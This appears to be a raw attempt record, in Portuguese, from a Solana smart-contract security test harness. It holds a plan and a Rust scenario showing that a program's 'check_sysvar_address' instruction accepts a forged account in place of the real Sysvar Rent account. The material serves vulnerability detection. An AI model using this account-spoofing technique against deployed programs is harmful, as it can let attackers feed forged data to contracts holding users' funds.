attempts.raw:
{
  "plan": "O programa-alvo recebe uma conta `rent` como AccountInfo genérico, sem validar que seu endereço é o ID oficial do Sysvar Rent. O baseline usa a conta real do Sysvar Rent (endereço oficial) e deve ter sucesso. O ataque substitui essa conta por uma conta forjada com dados controlados pelo atacante, mantendo o mesmo layout. O efeito medido é que a conta forjada foi aceita no lugar do Sysvar, demonstrando a falta de validação de endereço.",
  "scenario": "let rent_id = solana_program::sysvar::rent::ID;
let rent_account = account(&rent_id, &[], None);
let contas_baseline = vec![(rent_id, rent_account.clone())];
let ix_baseline = env.anchor_ix("check_sysvar_address", &(), vec![AccountMeta::new_readonly(rent_id, false)]);
let r_base = env.baseline("uso legitimo com Sysvar Rent real", &ix_baseline, &contas_baseline);

let fake_rent_id = Pubkey::new_unique();
let fake_rent_data = vec![0u8; 17];
let fake_rent_account = account(&fake_rent_id, &fake_rent_data, None);
let contas_ataque = vec![(fake_rent_id, fake_rent_account.clone())];
let ix_ataque = env.anchor_ix("check_sysvar_address", &(), vec![AccountMeta::new_readonly(fake_rent_id, false)]);
let r_ataque = env.attack("conta forjada no lugar do Sysvar Rent", &ix_ataque, &contas_ataque);

if r_ataque.program_result == ProgramResult::Success {
    let conta_depois = after(&r_ataque, &fake_rent_id);
    env.effect("conta forjada aceita no lugar do Sysvar Rent", conta_depois.data() == fake_rent_data.as_slice());
}"
}

